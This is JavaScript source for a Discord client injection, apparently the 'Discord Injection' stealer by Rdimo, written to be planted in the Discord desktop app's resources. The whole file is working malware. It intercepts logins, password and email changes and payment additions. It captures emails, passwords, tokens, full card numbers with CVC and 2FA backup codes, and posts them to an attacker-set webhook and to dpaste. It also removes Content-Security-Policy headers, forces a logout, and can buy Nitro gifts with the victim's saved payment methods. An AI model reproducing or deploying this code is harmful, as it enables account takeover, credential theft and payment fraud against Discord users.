const args = process.argv;
const fs = require('fs');
const path = require('path');
const querystring = require('querystring');
const { BrowserWindow, session } = require('electron')

const config = {
    auto_buy_nitro: false, 
    ping_on_run: false, 
    ping_val: '@everyone', 
    embed_name: 'Discord Injection', //name of the webhook thats gonna send the info
    embed_icon: 'https://raw.githubusercontent.com/Rdimo/images/master/Discord-Injection/discord atom.png'.replace(/ /g,'%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
    embed_color: 8363488, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
    webhook: '%WEBHOOK%', //your discord webhook there obviously
    /* DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING */
    api: 'https://discord.com/api/v9/users/@me',
    bin: 'https://dpaste.com/api/',
    nitro: {
        boost: {
            year: {
                id: "521847234246082599",
                sku: "511651885459963904",
                price: "9999",
            },
            month: {
                id: "521847234246082599",
                sku: "511651880837840896",
                price: "999",
            },
        },
        classic: {
            month: {
                id: "521846918637420545",
                sku: "511651871736201216",
                price: "499",
            },
        },
    },
    filter: {
        urls: [
            'https://discord.com/api/v*/users/@me',
            'https://discordapp.com/api/v*/users/@me',
            'https://*.discord.com/api/v*/users/@me',
            'https://discordapp.com/api/v*/auth/login',
            'https://discord.com/api/v*/auth/login',
            'https://*.discord.com/api/v*/auth/login',
            'https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts',
            'https://api.stripe.com/v*/tokens',
        ]
    },
    filter2: {
        urls: [
            'https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json', 
            'https://*.discord.com/api/v*/applications/detectable', 
            'https://discord.com/api/v*/applications/detectable', 
            'https://*.discord.com/api/v*/users/@me/library', 
            'https://discord.com/api/v*/users/@me/library', 
            'https://*.discord.com/api/v*/users/@me/billing/subscriptions', 
            'https://discord.com/api/v*/users/@me/billing/subscriptions',
            'wss://remote-auth-gateway.discord.gg/*',
        ]
    }
}

const discordPath = (function() {
    const useRelease = args[2] && args[2].toLowerCase() === "release";
    const releaseInput = useRelease ? args[3] && args[3].toLowerCase() : args[2] && args[2].toLowerCase();
    const release = releaseInput === "canary" ? "Discord Canary" : releaseInput === "ptb" ? "Discord PTB" : "Discord";
    let resourcePath = "";
    if (process.platform === "win32") {
        const basedir = path.join(process.env.LOCALAPPDATA, release.replace(/ /g, ""));
        const version = fs.readdirSync(basedir).filter(f => fs.lstatSync(path.join(basedir, f)).isDirectory() && f.split(".").length > 1).sort().reverse()[0];
        resourcePath = path.join(basedir, version, "resources");
    }
    else if (process.platform === "darwin") {
        const appPath = releaseInput === "canary" ? path.join("/Applications", "Discord Canary.app")
            : releaseInput === "ptb" ? path.join("/Applications", "Discord PTB.app")
            : useRelease && args[3] ? args[3] ? args[2] : args[2]
            : path.join("/Applications", "Discord.app");

        resourcePath = path.join(appPath, "Contents", "Resources");
    }

    if (fs.existsSync(resourcePath)) return resourcePath;
    return "";
})();

function updateCheck() {
    const appPath = path.join(discordPath, "app");
    const packageJson = path.join(appPath, "package.json");
    const resourceIndex = path.join(appPath, "index.js");
    if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
    if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson, (err) => {});
    if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex, (err) => {});
    

    if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
    fs.rmdirSync(path.join(__dirname, 'initiation'));
    execScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`)
    return !1;
}

const execScript = async(script) => {
    const window = BrowserWindow.getAllWindows()[0];
    return await window.webContents.executeJavaScript(script, !0)
};

const dpaste = async(content) => {
    const raw = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "${config.bin}", false);
    xmlHttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xmlHttp.send('content=${encodeURIComponent(content)}&expiry_days=30');
    xmlHttp.responseText;`)
    return raw+'.txt'
};

const getInfo = async(token) => {
    const info = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "${config.api}", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(null);
    xmlHttp.responseText;`)
    return JSON.parse(info)
};

const getMfa = async(password, token) => {
    if (!token.startsWith('.mfa')) return 'N/A';
    let content = "";
    const mfa = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "${config.api}/mfa/codes", false);
    xmlHttp.setRequestHeader('Content-Type', 'application/json');
    xmlHttp.setRequestHeader("authorization", "${token}");
    xmlHttp.send(JSON.stringify({\"password\":\"${password}\",\"regenerate\":false}));
    xmlHttp.responseText
    `)
    const json = JSON.parse(mfa)
    let codes = json.backup_codes
    const r = codes.filter((code) => {
        return code.consumed === null
    })
    for (let i in r) {
        content += `${r[i].code.insert(4, "-")}\n`
    } 
    const paste = await dpaste(content);
    return `[click me!](${paste})`
};

const fetchBilling = async(token) => {
    const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
    xmlHttp.setRequestHeader("Authorization", "${token}"); 
    xmlHttp.send(null); 
    xmlHttp.responseText`)
    if (bill && !bill.length) {
        return "";
    }
    return JSON.parse(JSON.parse(bill))
};
const getBilling = async (token) => {
    const data = await fetchBilling(token)
    if (data === "") return "❌";
    let billing = "";
    data.forEach(x => {
        if (x.type === 2 && !x.invalid) {
            billing += "✔️" + " <:paypal:951139189389410365>";
        } else if (x.type === 1 && !x.invalid) {
            billing += "✔️" + " 💳";
        } else {
            billing = "❌";
        };
    });
    if (billing === "") billing = "❌"
    return billing;
};

const Purchase = async (token, id, _type, _time) => {
    const req = execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "${config.api}/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(${JSON.stringify(
        {
            "gift": true,
            "sku_subscription_plan_id": config.nitro[_type][_time]['sku'],
            "payment_source_id": id,
            "payment_source_token": 'None',
            "expected_amount": config.nitro[_type][_time]['price'],
            "expected_currency": "usd",
            "purchase_token": "500fb34b-671a-4614-a72e-9d13becc2e95"
        }
    )});
    xmlHttp.responseText`)
    if (req['gift_code']) {
        return 'https://discord.gift/'+req['gift_code'];
    } else return null;
};

const buyNitro = async (token) => {
    if (!config.auto_buy_nitro) return 'Auto Buy Nitro disabled';
    const data = await fetchBilling(token);
    const valid = []
    data.forEach(x => {
        if (x.type === 2 && !x.invalid) {
            valid.push(x.id)
        } else if (x.type === 1 && !x.invalid) {
            valid.push(x.id)
        }
    });
    for (let id in valid) {
        const first = Purchase(token, id, 'boost', 'year')
        if (first !== null) {
            return first;
        } else {
            const second = Purchase(token, id, 'boost', 'month')
            if (second !== null) {
                return second;
            } else {
                const third = Purchase(token, id, 'classic', 'month')
                if (third !== null) {
                    return third;
                } else {
                    return 'Failed to Purchase Gift'
                }
            }
        }
    };
};

const getNitro = (flags) => {
    switch (flags) {
        case 0:
            return "No Nitro";
        case 1:
            return "Nitro Classic";
        case 2:
            return "Nitro Boost";
        default:
            return "No Nitro";
    };
};

const getBadges = (flags) => {
    let badges = "";
    switch (flags) {
        case 1:
            badges += "Discord Staff, "
            break;
        case 2:
            badges += "Partnered Server Owner, "
            break;
        case 131072:
            badges += "Discord Developer, "
            break;
        case 4:
            badges += "Hypesquad Event, "
            break;
        case 16384:
            badges += "Gold BugHunter, "
            break;
        case 8:
            badges += "Green BugHunter, "
            break;
        case 512:
            badges += "Early Supporter, "
            break;
        case 128:
            badges += "HypeSquad Brillance, "
            break;
        case 64:
            badges += "HypeSquad Brillance, "
            break;
        case 256:
            badges += "HypeSquad Balance, "
            break;
        case 0:
            badges = "None"
            break;
        default:
            badges = "None"
            break;
    }
    return badges
}
const hooker = (content) => {
    execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "${config.webhook}", true);
    xmlHttp.setRequestHeader('Content-Type', 'application/json');
    xmlHttp.setRequestHeader('Access-Control-Allow-Origin', '*');
    xmlHttp.send(JSON.stringify(${JSON.stringify(content)}));
`)
}
const login = async (email, password, token) => {
    const json = await getInfo(token);
    const nitro = getNitro(json.premium_type);
    const badges = getBadges(json.flags)
    const billing = await getBilling(token)
    const mfa = await getMfa(password, token);
    const content = {
        username: config.embed_name,
        avatar_url: config.embed_icon,
        embeds: [
            {
                "color": config.embed_color,
                "fields": [
                    {
                        "name": "**Account Info**",
                        "value": `Email: **${email}** - Password: **${password}**`,
                        "inline": false
                    },
                    {
                        "name": "**Other Info**",
                        "value": `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**\n2fa Codes: **${mfa}**`,
                        "inline": false
                    },
                    {
                        "name": "**Token**",
                        "value": `\`${token}\``,
                        "inline": false
                    }
                ],
                "author": {
                    "name": json.username +"#" + json.discriminator + "・" + json.id,
                    "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                },
                "footer": {
                    "text": "Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection"
                }
            }
        ]
    }
    if (config.ping_on_run) content['content'] = config.ping_val;
    hooker(content)
}
const passwordChanged = async (oldpassword, newpassword, token) => {
    const json = await getInfo(token);
    const nitro = getNitro(json.premium_type);
    const badges = getBadges(json.flags)
    const billing = await getBilling(token)
    const mfa = await getMfa(newpassword, token)
    const content = {
        username: config.embed_name,
        avatar_url: config.embed_icon,
        embeds: [
            {
                "color": config.embed_color,
                "fields": [
                    {
                        "name": "**Password Changed**",
                        "value": `Email: **${json.email}**\nOld Password: **${oldpassword}**\nNew Password: **${newpassword}**`,
                        "inline": true
                    },
                    {
                        "name": "**Other Info**",
                        "value": `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**\n2fa Codes: **${mfa}**`,
                        "inline": true
                    },
                    {
                        "name": "**Token**",
                        "value": `\`${token}\``,
                        "inline": false
                    }
                ],
                "author": {
                    "name": json.username +"#" + json.discriminator + "・" + json.id,
                    "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                },
                "footer": {
                    "text": "Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection"
                }
            }
        ]
    }
    if (config.ping_on_run) content['content'] = config.ping_val;
    hooker(content)
}
const emailChanged = async (email, password, token) => {
    const json = await getInfo(token);
    const nitro = getNitro(json.premium_type);
    const badges = getBadges(json.flags)
    const billing = await getBilling(token)
    const mfa = await getMfa(password, token)
    const content = {
        username: config.embed_name,
        avatar_url: config.embed_icon,
        embeds: [
            {
                "color": config.embed_color,
                "fields": [
                    {
                        "name": "**Email Changed**",
                        "value": `New Email: **${email}**\nPassword: **${password}**`,
                        "inline": true
                    },
                    {
                        "name": "**Other Info**",
                        "value": `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**\n2fa Codes: **${mfa}**`,
                        "inline": true
                    },
                    {
                        "name": "**Token**",
                        "value": `\`${token}\``,
                        "inline": false
                    }
                ],
                "author": {
                    "name": json.username +"#" + json.discriminator + "・" + json.id,
                    "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                },
                "footer": {
                    "text": "Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection"
                }
            }
        ]
    }
    if (config.ping_on_run) content['content'] = config.ping_val;
    hooker(content)
}

const PaypalAdded = async (token) => {
    const json = await getInfo(token);
    const nitro = getNitro(json.premium_type);
    const badges = getBadges(json.flags)
    const billing = getBilling(token)
    const code = await buyNitro(token)
    const content = {
        username: config.embed_name,
        avatar_url: config.embed_icon,
        embeds: [
            {
                "color": config.embed_color,
                "fields": [
                    {
                        "name": "**Paypal Added**",
                        "value": `Nitro code: \`${code}\``,
                        "inline": false
                    },
                    {
                        "name": "**Other Info**",
                        "value": `Nitro Type: **${nitro}*\nBadges: **${badges}**\nBilling: **${billing}**`,
                        "inline": false
                    },
                    {
                        "name": "**Token**",
                        "value": `\`${token}\``,
                        "inline": false
                    }
                ],
                "author": {
                    "name": json.username +"#" + json.discriminator + "・" + json.id,
                    "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                },
                "footer": {
                    "text": "Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection"
                }
            }
        ]
    }
    if (config.ping_on_run) content['content'] = config.ping_val;
    hooker(content)
}
const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
    const json = await getInfo(token);
    const nitro = getNitro(json.premium_type);
    const badges = getBadges(json.flags)
    const billing = await getBilling(token)
    const code = await buyNitro(token)
    const content = {
        username: config.embed_name,
        avatar_url: config.embed_icon,
        embeds: [
            {
                "color": config.embed_color,
                "fields": [
                    {
                        "name": "**Credit Card Added**",
                        "value": `Credit Card Number: ${number}\nCVC: ${cvc}\nCredit Card Expiration: ${expir_month}/${expir_year}`,
                        "inline": true
                    },
                    {
                        "name": "**Other Info**",
                        "value": `Nitro Type: **${nitro}**\nBadges: **${badges}**\nBilling: **${billing}**`,
                        "inline": true
                    },
                    {
                        "name": "**Nitro Code**",
                        "value": `\`${code}\``,
                        "inline": false
                    },
                    {
                        "name": "**Token**",
                        "value": `\`${token}\``,
                        "inline": false
                    }
                ],
                "author": {
                    "name": json.username +"#" + json.discriminator + "・" + json.id,
                    "icon_url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`
                },
                "footer": {
                    "text": "Discord Injection By github.com/Rdimo・https://github.com/Rdimo/Discord-Injection"
                }
            }
        ]
    }
    if (config.ping_on_run) content['content'] = config.ping_val;
    hooker(content)
}

session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
    if (details.url.startsWith("wss://")) {
        callback({
            cancel: true
        })
        return;
    }
    if (updateCheck()) {}

    callback({})
    return;
})

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
    if (details.url.startsWith(config.webhook)) {
        if (details.url.includes("discord.com")) {
            callback({
                responseHeaders: Object.assign({
                    'Access-Control-Allow-Headers': "*"
                }, details.responseHeaders)
            });
        } else {
            callback({
                responseHeaders: Object.assign({
                    "Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
                    'Access-Control-Allow-Headers': "*",
                    "Access-Control-Allow-Origin": "*"
                }, details.responseHeaders)
            });
        }
    } else {
        delete details.responseHeaders['content-security-policy'];
        delete details.responseHeaders['content-security-policy-report-only'];

        callback({
            responseHeaders: {
                ...details.responseHeaders,
                'Access-Control-Allow-Headers': "*"
            }
        })
    }
})

session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
    const unparsedData = details.uploadData[0].bytes
    const data = JSON.parse(Buffer.from(unparsedData).toString())
    const token = await execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`)

    switch (true) {
        case details.url.endsWith('login'):
            login(data.login, data.password, token)
            break;

        case details.url.endsWith('users/@me') && details.method === 'PATCH' && data.password:
            if (data.email) {
                emailChanged(data.email, data.password, token)
            };
            if (data.new_password) {
                passwordChanged(data.password, data.new_password, token)
            }
            break;

        case details.url.endsWith('tokens') && details.method === "POST":
            const item = querystring.parse(unparsedData.toString())
            ccAdded(item["card[number]"], item["card[cvc]"], item["card[exp_month]"], item["card[exp_year]"], token)
            break;

        case details.url.endsWith('paypal_accounts') && details.method === "POST":
            PaypalAdded(token)
            break;
        default:
            break;
    }
});
module.exports = require('./core.asar')